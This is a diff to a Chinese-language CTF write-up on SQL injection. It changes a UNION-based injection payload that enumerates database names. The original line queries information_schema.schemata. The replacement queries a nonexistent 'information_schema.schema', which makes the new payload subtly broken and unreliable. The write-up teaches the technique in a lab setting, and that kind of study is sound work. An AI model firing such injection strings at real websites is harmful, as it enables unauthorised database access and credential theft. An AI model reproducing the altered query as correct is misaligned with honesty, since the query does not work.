@@ -87,7 +87,7 @@
 获取到管理员账号密码，注入成功。但是我们还要获取flag，下面查询所有数据库名
 
 ```sql
-?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata %23
+?id=0' union select 1,2,group_concat(schema_name) from information_schema.schema %23
 ```
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/$YM6ZO66$9C$$3Z{DUDM81G.png?raw=true">
